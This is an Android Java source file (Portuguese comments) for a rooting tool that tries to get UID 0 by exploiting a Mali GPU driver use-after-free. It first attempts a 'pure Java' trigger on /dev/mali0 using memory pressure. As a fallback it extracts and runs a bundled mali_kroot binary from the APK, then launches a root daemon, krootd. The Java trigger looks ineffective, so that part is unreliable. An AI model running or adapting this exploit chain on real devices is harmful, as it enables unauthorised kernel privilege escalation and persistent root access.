package com.chronokairo.kroot;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;

/**
 * Provedor de root baseado no exploit Mali UAF, reimplementado em Java.
 *
 * Estratégia (em ordem):
 *  1. Exploit Java puro (abre /dev/mali0, pressiona memória, tenta UAF via leitura/gravação)
 *  2. Fallback: copia o binário mali_kroot empacotado no APK (res/raw) para
 *     o diretório privado do app, dá permissão de execução e roda
 *
 * Se qualquer etapa obtiver UID 0, inicia o krootd.
 *
 * Todos os caminhos de binário vêm do BinaryInstaller (diretório privado do app).
 */
public class MaliUafJavaProvider implements RootProvider {

    private static final String TAG = "MaliUafJavaProvider";

    private static final String MALI_DEVICE = "/dev/mali0";

    // Tamanho do pressure buffer (~128 MB, como no exploit original)
    private static final long PRESSURE_SIZE = 128L * 1024L * 1024L;
    private static final int CHUNK_SIZE = 30 * 1024 * 1024; // 30 MB por chunk

    private final Context context;
    private final String krootdPath;
    private final String suPath;
    private final String maliPath;

    public MaliUafJavaProvider(Context context, BinaryInstaller installer) {
        this.context = context;
        this.krootdPath = installer.getKrootdPath();
        this.suPath = installer.getSuPath();
        this.maliPath = installer.getMaliPath();
    }

    @Override
    public String getName() {
        return "Mali UAF (Java + binário empacotado)";
    }

    @Override
    public boolean isAvailable() {
        File mali = new File(MALI_DEVICE);
        return mali.exists() && mali.canRead() && mali.canWrite();
    }

    @Override
    public boolean acquireRoot() {
        // Estratégia 1: Java puro
        Log.i(TAG, "Estratégia 1: exploit Mali UAF em Java puro");
        if (tryJavaPureExploit()) {
            Log.i(TAG, "SUCESSO: UID 0 obtido via Java puro");
            return true;
        }

        // Estratégia 2: fallback com binário empacotado
        Log.i(TAG, "Estratégia 2: fallback com binário mali_kroot empacotado");
        if (tryPackagedBinary()) {
            Log.i(TAG, "SUCESSO: UID 0 obtido via binário empacotado");
            return true;
        }

        Log.w(TAG, "Falha: nenhuma estratégia obteve UID 0");
        return false;
    }

    /**
     * Exploit Java puro: abre /dev/mali0, pressiona memória e tenta disparar UAF.
     */
    private boolean tryJavaPureExploit() {
        if (!isAvailable()) {
            Log.e(TAG, "/dev/mali0 não disponível");
            return false;
        }

        Log.i(TAG, "Iniciando exploit Mali UAF em Java puro");

        FileInputStream fis = null;
        FileOutputStream fos = null;
        try {
            fis = new FileInputStream(MALI_DEVICE);
            fos = new FileOutputStream(MALI_DEVICE);
            Log.i(TAG, "/dev/mali0 aberto");
        } catch (IOException e) {
            Log.e(TAG, "Não foi possível abrir /dev/mali0", e);
            return false;
        }

        // Pressure de memória
        Log.i(TAG, "Fazendo pressure de memória (~" + (PRESSURE_SIZE / (1024*1024)) + " MB)...");
        boolean pressureOk = doMemoryPressure();
        if (!pressureOk) {
            Log.w(TAG, "Pressure parcial, continuando mesmo assim...");
        }

        // Tentar disparar UAF
        Log.i(TAG, "Tentando disparar UAF...");
        tryTriggerUaf(fis);

        // Verificar se conseguimos UID 0
        boolean gotRoot = hasRoot();
        if (gotRoot) {
            Log.i(TAG, "SUCESSO: UID 0 via Java puro");
        } else {
            Log.w(TAG, "Java puro não obteve UID 0");
        }

        try { fis.close(); } catch (IOException ignored) {}
        try { fos.close(); } catch (IOException ignored) {}

        return gotRoot;
    }

    /**
     * Fallback: copia o binário mali_kroot do res/raw para
     * o diretório privado do app,
     * dá permissão de execução e roda.
     */
    private boolean tryPackagedBinary() {
        File tmp = new File(maliPath);

        // Copiar do raw para o dispositivo (se ainda não existir ou for antigo)
        if (!tmp.exists() || !tmp.canExecute()) {
            Log.i(TAG, "Copiando mali_kroot do APK para " + maliPath);
            if (!copyRawToDevice(R.raw.mali_kroot, maliPath)) {
                Log.e(TAG, "Falha ao copiar mali_kroot do APK");
                return false;
            }
            tmp.setExecutable(true, false);
        }

        if (!tmp.canExecute()) {
            Log.e(TAG, "mali_kroot copiado mas não é executável");
            return false;
        }

        Log.i(TAG, "Executando " + maliPath);
        try {
            Process p = new ProcessBuilder(maliPath)
                    .redirectErrorStream(true)
                    .start();

            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = br.readLine()) != null) {
                output.append(line).append("\n");
                Log.d(TAG, "mali_kroot: " + line);
            }
            Log.d(TAG, "saída completa mali_kroot:\n" + output);

            p.waitFor();
            int exitCode = p.exitValue();
            Log.i(TAG, "mali_kroot finalizado (exit=" + exitCode + ")");
        } catch (Exception e) {
            Log.e(TAG, "Erro executando mali_kroot", e);
            return false;
        }

        // Verificar se obteve UID 0
        boolean gotRoot = hasRoot();
        if (gotRoot) {
            Log.i(TAG, "SUCESSO: UID 0 via binário empacotado");
        } else {
            Log.w(TAG, "Binário empacotado não obteve UID 0");
        }
        return gotRoot;
    }

    /**
     * Copia um recurso raw do APK para um caminho no dispositivo.
     */
    private boolean copyRawToDevice(int resId, String destPath) {
        try (InputStream in = context.getResources().openRawResource(resId);
             FileOutputStream out = new FileOutputStream(destPath)) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            out.flush();
            File f = new File(destPath);
            f.setExecutable(true, false);
            Log.i(TAG, "Copiado " + resId + " para " + destPath + " (" + f.length() + " bytes)");
            return true;
        } catch (IOException e) {
            Log.e(TAG, "Erro copiando recurso raw para " + destPath, e);
            return false;
        }
    }

    /**
     * Aloca chunks de memória off-heap para criar pressure no sistema.
     */
    private boolean doMemoryPressure() {
        long allocated = 0;
        ByteBuffer[] chunks = new ByteBuffer[64];
        int chunkCount = 0;

        try {
            while (allocated < PRESSURE_SIZE && chunkCount < chunks.length) {
                long remaining = PRESSURE_SIZE - allocated;
                long size = Math.min(CHUNK_SIZE, remaining);
                ByteBuffer buf = ByteBuffer.allocateDirect((int) size);
                buf.position(0);
                buf.limit((int) size);
                for (int i = 0; i < size; i += 4096) {
                    buf.putInt(i, 0xDEADBEEF);
                }
                chunks[chunkCount++] = buf;
                allocated += size;
            }
            Log.i(TAG, "Pressure alocado: " + (allocated / (1024*1024)) + " MB em " + chunkCount + " chunks");

            Thread.sleep(500);

            // Liberar metade para criar condições de UAF
            for (int i = 0; i < chunkCount / 2; i++) {
                chunks[i] = null;
            }
            System.gc();
            Thread.sleep(300);

            return true;
        } catch (OutOfMemoryError e) {
            Log.w(TAG, "OutOfMemory durante pressure: " + (allocated / (1024*1024)) + " MB antes do OOM");
            return allocated > 0;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return false;
        }
    }

    /**
     * Tenta disparar o UAF via leitura/gravação em /dev/mali0.
     * Java puro não suporta IOCTL direto sem JNI, então tentamos caminhos
     * de leitura/gravação que possam atingir código vulnerável.
     */
    private void tryTriggerUaf(FileInputStream fis) {
        try {
            byte[] trigger = new byte[4096];
            for (int i = 0; i < trigger.length; i++) {
                trigger[i] = (byte) (i * 7 + 0x41);
            }
            fis.read(trigger);
            Log.i(TAG, "Tentativa de UAF via /dev/mali0 concluída");
        } catch (IOException e) {
            Log.w(TAG, "Erro durante tentativa de UAF: " + e.getMessage());
        }
    }

    @Override
    public boolean hasRoot() {
        try {
            Process p = new ProcessBuilder("id", "-u")
                    .redirectErrorStream(true)
                    .start();
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String uid = br.readLine();
            p.waitFor();
            return uid != null && uid.trim().equals("0");
        } catch (Exception e) {
            Log.e(TAG, "Erro verificando UID", e);
            return false;
        }
    }

    @Override
    public boolean startKrootd() {
        if (!hasRoot()) {
            Log.e(TAG, "Não há UID 0 para iniciar krootd");
            return false;
        }

        File krootd = new File(krootdPath);
        if (!krootd.exists() || !krootd.canExecute()) {
            Log.e(TAG, "krootd não disponível em " + krootdPath);
            return false;
        }

        try {
            Log.i(TAG, "Iniciando krootd como root (UID 0)");
            Process p = new ProcessBuilder(krootdPath, "--daemon")
                    .redirectErrorStream(true)
                    .start();
            p.waitFor();

            for (int i = 0; i < 20; i++) {
                if (isKrootdOnline()) {
                    Log.i(TAG, "krootd online");
                    return true;
                }
                Thread.sleep(500);
            }
            Log.w(TAG, "krootd não ficou online após aguardar");
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Erro iniciando krootd", e);
            return false;
        }
    }

    @Override
    public boolean isKrootdOnline() {
        try {
            Process p = new ProcessBuilder(suPath, "--status")
                    .redirectErrorStream(true)
                    .start();
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            p.waitFor();
            return sb.toString().contains("online");
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public boolean stopKrootd() {
        try {
            Process p = new ProcessBuilder(suPath, "-c", krootdPath + " --stop")
                    .redirectErrorStream(true)
                    .start();
            p.waitFor();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Erro parando krootd", e);
            return false;
        }
    }
}
